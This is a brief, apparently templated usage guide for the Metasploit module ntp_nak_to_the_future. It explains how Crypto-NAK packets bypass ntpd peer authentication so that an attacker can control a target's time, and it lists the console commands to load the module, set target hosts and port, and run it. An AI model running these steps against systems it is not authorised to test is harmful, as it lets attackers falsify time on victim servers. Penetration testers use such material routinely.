**The description of current metasploit exploit**
Crypto-NAK packets can be used to cause ntpd to accept time from          unauthenticated ephemeral symmetric peers by bypassing the          authentication required to mobilize peer associations.  This module          sends these Crypto-NAK packets in order to establish an association          between the target ntpd instance and the attacking client.  The end goal          is to cause ntpd to declare the legitimate peers "false tickers" and          choose the attacking clients as the preferred peers, allowing          these peers to control time.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/ntp/ntp_nak_to_the_future
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
set RPORT <your target port here>
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.